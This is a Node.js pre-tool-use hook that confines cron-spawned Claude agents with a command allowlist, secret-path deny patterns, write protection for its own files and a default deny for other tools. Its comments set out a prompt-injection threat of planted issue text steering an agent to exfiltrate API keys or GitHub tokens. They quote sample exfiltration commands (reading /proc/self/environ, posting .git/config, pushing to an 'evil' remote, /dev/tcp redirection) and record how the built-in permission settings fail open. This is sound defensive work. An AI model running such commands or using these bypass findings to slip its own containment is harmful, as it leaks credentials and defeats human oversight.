#!/usr/bin/env node
// =============================================================================
// Cron containment — deny-by-default PreToolUse hook (v3.1 / #5018, #5000, #5004)
// =============================================================================
//
// PURPOSE. After `sandbox.enabled:false` removes the OS bash sandbox from the
// cron eval substrate (the host-independence fix for the recurring bwrap-userns
// drift), this hook is the SOLE fail-closed containment for cron-spawned
// `claude --print` agents. Phase-0 probes (committed AC0 evidence) proved that
// in headless `--print`:
//   - `--allowedTools` + `defaultMode` do NOT fail-close — non-allowlisted Bash
//     commands RUN; only an explicit `permissions.deny` rule OR a PreToolUse
//     hook blocks. (D0a)
//   - a `Read(/proc/**)` deny does NOT cover `cat /proc/self/environ` run via
//     the Bash tool. (D0b)
//   - a PreToolUse hook returning `permissionDecision:"deny"` DOES block — for
//     Bash AND for Read/Glob/Grep AND (via a `*` matcher) for any other tool.
//     (D0c, D-new-2, D-new-3, the 2.1.79 re-probes)
//   - a crashed/missing hook, OR a tool class with no matcher, FAILS OPEN.
//     (D-new-1) → the substrate runs a spawn-time self-test and registers this
//     hook under a `*` catch-all so no tool class is unhooked.
//
// THREAT. An injected GitHub-issue body / HN comment / social snippet steers a
// cron's model to exfiltrate `ANTHROPIC_API_KEY` (billing abuse) or the broadly
// scoped `GH_TOKEN` (`gh pr merge --auto` on the public auto-deploying repo).
// Exfil needs (a) a secret in model context AND (b) egress. This hook severs
// BOTH: every secret-read path (env dump, `/proc`, `.git/config` where the clone
// URL embeds the token, `.env`, gh/ssh/aws cred files) is denied across Bash AND
// the Read/Glob/Grep tools; every egress verb + every non-allowlisted command is
// denied; argument-injection (`--body-file /proc/self/environ`, `gh api -f
// body=@.git/config`, `git remote add evil && git push evil`) is denied even
// when the leading verb is allowlisted. Secret-never-in-context is the real
// invariant — see SECURITY PANEL P0-A.
//
// CONTRACT. stdin = the PreToolUse JSON; argv[2] = absolute path to the per-cron
// allowlist file (one `verb prefix` per line, `#` comments allowed). The
// allowlist is delivered as a FILE (not env / not an arg the model could read
// via `ps`) and lives under the spawn's `.claude/` which this hook also denies
// reading. Output = the PreToolUse decision JSON on stdout; ALWAYS exit 0.
//
// FAIL-CLOSED. Any parse error, missing field, unreadable allowlist, or
// unrecognized tool resolves to DENY. There is no code path that allows on
// uncertainty. NEVER throw / NEVER `process.exit(non-zero)` — a crash fails OPEN
// (D-new-1), so the whole body is wrapped and the catch emits deny.
// =============================================================================

import { readFileSync } from "node:fs";

// ---- decision primitives ---------------------------------------------------

export function allowDecision() {
  return {
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "allow",
    },
  };
}

export function denyDecision(reason) {
  return {
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: `cron-containment: ${reason}`,
    },
  };
}

// Secret / credential paths that must never be read by ANY tool (Bash cat,
// Read, Glob, Grep). Matched as substrings against the resolved path argument.
// `.git` is load-bearing: `buildAuthenticatedCloneUrl` writes the GH_TOKEN into
// remote.origin.url → .git/config (SECURITY PANEL P0-A).
const SECRET_PATH_PATTERNS = [
  /(^|\/)\.git(\/|$)/, // .git/config, .git/logs/HEAD, packed-refs
  /(^|\/)proc(\/|$)/, // /proc/self/environ, /proc/*/cmdline
  /\.env(\.[\w-]+)?$/, // .env, .env.local, .env.production
  /(^|\/)\.env(\/|$)/,
  /(^|\/)\.ssh(\/|$)/,
  /(^|\/)\.aws(\/|$)/,
  /(^|\/)\.netrc$/,
  /(^|\/)\.docker(\/|$)/,
  /(^|\/)\.config(\/|$)/, // ~/.config/gh/hosts.yml (gh cred store)
  /(^|\/)\.gitconfig$/,
  /(^|\/)\.git-credentials$/, // git credential-store plaintext (defense-in-depth)
  /(^|\/)\.claude(\/|$)/, // the spawn settings + this hook's allowlist file
  /(^|\/)settings\.json$/,
  /(^|\/)hosts\.ya?ml$/,
  /(^|\/)run\/secrets(\/|$)/,
  /\.npmrc$/,
];

// Write/Edit-protected paths: a model rewriting the hook, its allowlist, or the
// settings file would neuter containment on the NEXT tool call (D-new-2).
const WRITE_PROTECTED_PATTERNS = [
  /(^|\/)\.claude(\/|$)/,
  /cron-bash-allowlist-hook/,
  /(^|\/)settings\.json$/,
  /(^|\/)\.git(\/|$)/,
  /\.env(\.[\w-]+)?$/,
];

// Quote-stripping helpers for metachar detection. Shell semantics:
//   - single-quoted spans are fully literal → strip for ALL metachar checks
//     (so `gh api '...' --jq '.[] | {n}'` is not falsely denied — P1-F).
//   - double-quoted spans keep `$(`/`` ` ``/`${` ACTIVE but make `|`/`>`/`<`/`&`
//     literal → strip only for the control-metachar check, KEEP for the
//     substitution check (so `"$(cat .git/config)"` is still denied).
// Returns null on an unbalanced quote (→ caller denies).
function stripQuoted(command, { stripDouble }) {
  let out = "";
  let quote = null;
  for (let i = 0; i < command.length; i++) {
    const ch = command[i];
    if (quote) {
      if (ch === quote) quote = null;
      else if (quote === '"' && !stripDouble) out += ch; // keep dq contents for subst check
      // else: inside a stripped quote span → drop
    } else if (ch === "'" || ch === '"') {
      quote = ch;
    } else {
      out += ch;
    }
  }
  if (quote) return null; // unbalanced quote
  return out;
}

// Shell metacharacters that enable command substitution / obfuscation /
// redirection / piping / backgrounding. Their presence (OUTSIDE quoting that
// neutralizes them) is an unconditional deny — no Tier-1 cron verb needs them,
// and they are the primary bypass of a leading-verb allowlist
// (`gh issue list && cat /proc/self/environ`, `"$(...)"`, `> /dev/tcp/...`).
// `&&` / `||` / `;` are chain operators handled by segment-splitting.
// Returns a deny reason string, or null if clean.
function dangerousMetacharReason(command) {
  if (/[\n\r]/.test(command)) return "multiline command";
  // substitution: active even inside double quotes → strip only single quotes
  const substScan = stripQuoted(command, { stripDouble: false });
  if (substScan === null) return "unbalanced quote";
  if (/`/.test(substScan)) return "backtick substitution";
  if (/\$\(/.test(substScan)) return "$(...) substitution";
  if (/\$\{/.test(substScan)) return "${...} expansion";
  if (/<\(|>\(/.test(substScan)) return "process substitution";
  // control metachars: literal inside any quote → strip single AND double
  const ctrlScan = stripQuoted(command, { stripDouble: true });
  if (ctrlScan === null) return "unbalanced quote";
  if (/[<>]/.test(ctrlScan)) return "redirection";
  if (/(^|[^|])\|([^|]|$)/.test(ctrlScan)) return "pipe";
  if (/(^|[^&])&([^&]|$)/.test(ctrlScan)) return "background &";
  return null;
}

// Split a (metachar-free) compound command into segments on && ; ||.
export function splitSegments(command) {
  return command
    .split(/\s*(?:&&|\|\||;)\s*/)
    .map((s) => s.trim())
    .filter(Boolean);
}

// Tokenize a single simple command respecting single/double quotes, so that a
// quoted argument like `--jq '.[] | {n}'` is ONE token (its inner `|` is data,
// not a shell pipe) and the leading-verb match is not fooled by quoting tricks.
// Returns null on an unbalanced quote (→ caller denies).
export function tokenize(segment) {
  const tokens = [];
  let cur = "";
  let quote = null;
  let sawAny = false;
  for (let i = 0; i < segment.length; i++) {
    const ch = segment[i];
    if (quote) {
      if (ch === quote) quote = null;
      else cur += ch;
      sawAny = true;
    } else if (ch === "'" || ch === '"') {
      quote = ch;
      sawAny = true;
    } else if (/\s/.test(ch)) {
      if (cur || sawAny) {
        tokens.push(cur);
        cur = "";
        sawAny = false;
      }
    } else {
      cur += ch;
      sawAny = true;
    }
  }
  if (quote) return null; // unbalanced quote → deny
  if (cur || sawAny) tokens.push(cur);
  return tokens;
}

// Argument-injection / egress-via-allowed-verb denials that apply even when the
// leading verb is allowlisted (SECURITY PANEL P0-B). Returns a deny reason or
// null if clean.
function argumentInjectionReason(tokens) {
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    // gh/curl-style file-as-body flags read a file the model never saw and post
    // it to the public repo: --body-file <path>, -F field=@file, --field f=@f,
    // -f body=@file, gh's `@-`/`@file` value forms.
    if (t === "--body-file" || t === "-F" || t === "--field" || t === "-f") {
      const v = tokens[i + 1] || "";
      if (v.includes("@") || /\.\.|\/(proc|etc|root|home)\b|\.git|\.env/.test(v))
        return `file-as-arg via ${t}`;
    }
    if (/^--body-file=/.test(t)) return "file-as-arg via --body-file=";
    if (/=@/.test(t) || /^@/.test(t)) return "@file argument";
    // VAR=val prefix (env indirection before the verb) — leading token only
    if (i === 0 && /^[A-Za-z_][A-Za-z0-9_]*=/.test(t))
      return "env-assignment prefix";
  }
  return null;
}

// git sub-commands that surface the tokenized remote URL or redirect the authed
// remote — denied regardless of the allowlist (SECURITY PANEL P0-B).
function gitVerbReason(tokens) {
  if (tokens[0] !== "git") return null;
  const sub = tokens[1];
  if (sub === "config") return "git config (reveals remote.origin.url token)";
  if (sub === "remote") return "git remote (set-url/get-url leaks/redirects token)";
  if (sub === "ls-remote") return "git ls-remote (prints remote URL)";
  if (sub === "push") {
    // `--repo <url>` / `--repo=<url>` is documented as equivalent to the
    // positional <repository> arg (git push --help). A `-`-prefixed token
    // escapes the positional filter below, so check it explicitly — else
    // `git push --repo=https://evil/x` is an egress channel past the
    // origin-only enforcer (security-sentinel P1).
    for (let i = 2; i < tokens.length; i++) {
      const t = tokens[i];
      if (t === "--repo") {
        if ((tokens[i + 1] ?? "") !== "origin")
          return "git push --repo to a non-origin remote";
      } else if (t.startsWith("--repo=")) {
        if (t.slice("--repo=".length) !== "origin")
          return "git push --repo= to a non-origin remote";
      }
    }
    // a positional push target must be exactly `origin` (or omitted → default).
    const rest = tokens.slice(2).filter((t) => !t.startsWith("-"));
    if (rest.length && rest[0] !== "origin")
      return `git push to non-origin remote '${rest[0]}'`;
  }
  return null;
}

function loadAllowlist(path) {
  if (!path) return null; // no allowlist file → deny-all (fail-closed)
  try {
    return readFileSync(path, "utf-8")
      .split("\n")
      .map((l) => l.trim())
      .filter((l) => l && !l.startsWith("#"));
  } catch {
    return null; // unreadable → deny-all (fail-closed)
  }
}

function segmentMatchesAllowlist(segment, allowPrefixes) {
  // normalize internal whitespace for prefix comparison
  const norm = segment.replace(/\s+/g, " ").trim();
  return allowPrefixes.some(
    (p) => norm === p || norm.startsWith(p + " ") || norm.startsWith(p),
  );
}

// ---- the decision function (pure; unit-tested) -----------------------------

export function decide(input, allowPrefixes) {
  let parsed;
  try {
    parsed = typeof input === "string" ? JSON.parse(input) : input;
  } catch {
    return denyDecision("unparseable PreToolUse input");
  }
  if (!parsed || typeof parsed !== "object")
    return denyDecision("empty PreToolUse input");

  const tool = parsed.tool_name;
  const ti = parsed.tool_input || {};

  // Deny-all when the allowlist could not be loaded (fail-closed).
  if (allowPrefixes === null) return denyDecision("no allowlist (fail-closed)");

  switch (tool) {
    case "Bash": {
      const command = typeof ti.command === "string" ? ti.command : "";
      if (!command.trim()) return denyDecision("empty Bash command");
      const metaReason = dangerousMetacharReason(command);
      if (metaReason) return denyDecision(`metachar: ${metaReason}`);
      const segments = splitSegments(command);
      if (!segments.length) return denyDecision("no command segment");
      for (const seg of segments) {
        const tokens = tokenize(seg);
        if (tokens === null) return denyDecision("unbalanced quote");
        if (!tokens.length) return denyDecision("empty segment");
        const argReason = argumentInjectionReason(tokens);
        if (argReason) return denyDecision(argReason);
        const gitReason = gitVerbReason(tokens);
        if (gitReason) return denyDecision(gitReason);
        // Match the allowlist against the TOKENIZED (dequoted) command, not the
        // raw segment — otherwise a quoted arg like `gh api 'repos/...'` fails
        // the prefix match against `gh api repos/...` (AC4b single-quote fix).
        if (!segmentMatchesAllowlist(tokens.join(" "), allowPrefixes))
          return denyDecision(`not allowlisted: ${seg.slice(0, 60)}`);
      }
      return allowDecision();
    }
    case "Read":
    case "Glob":
    case "Grep": {
      const p = ti.file_path || ti.path || ti.pattern || "";
      const grepPath = ti.path || "";
      for (const target of [p, grepPath]) {
        if (target && SECRET_PATH_PATTERNS.some((re) => re.test(target)))
          return denyDecision(`secret-path read: ${target.slice(0, 60)}`);
      }
      return allowDecision();
    }
    case "Write":
    case "Edit":
    case "MultiEdit": {
      const p = ti.file_path || ti.path || "";
      if (WRITE_PROTECTED_PATTERNS.some((re) => re.test(p)))
        return denyDecision(`protected-path write: ${p.slice(0, 60)}`);
      return allowDecision();
    }
    case "ToolSearch":
    case "TodoWrite":
      // Inert internal tools: ToolSearch only loads deferred tool SCHEMAS (no
      // execution/egress — discovery ≠ execution; a discovered mcp__*/WebFetch
      // still hits the catch-all deny when CALLED); TodoWrite mutates in-memory
      // task state. Denying them breaks the agent's tool plumbing for zero
      // security gain. (Confirmed needed by the 2.1.79 real-spawn probe.)
      return allowDecision();
    default:
      // Catch-all: WebFetch, WebSearch, Task, any mcp__* tool, anything new.
      // No Tier-1 cron needs these; egress/sub-agent classes are denied until
      // the Tier-2 firewall lands.
      return denyDecision(`tool class not permitted: ${tool || "<unknown>"}`);
  }
}

// ---- CLI entry (invoked by claude as `node <this> <allowlist-file>`) --------

function readStdin() {
  try {
    return readFileSync(0, "utf-8");
  } catch {
    return "";
  }
}

function main() {
  let decision;
  try {
    const allow = loadAllowlist(process.argv[2]);
    decision = decide(readStdin(), allow);
  } catch (e) {
    // Absolute backstop: never let an unexpected throw fail open.
    decision = denyDecision(`hook internal error: ${e && e.message}`);
  }
  process.stdout.write(JSON.stringify(decision));
  // ALWAYS exit 0 — a non-zero exit is treated as "no decision" → fail-open.
  process.exit(0);
}

// Run as CLI only when executed directly (not when imported by the test).
const invokedPath = process.argv[1] || "";
if (invokedPath.endsWith("cron-bash-allowlist-hook.mjs")) main();
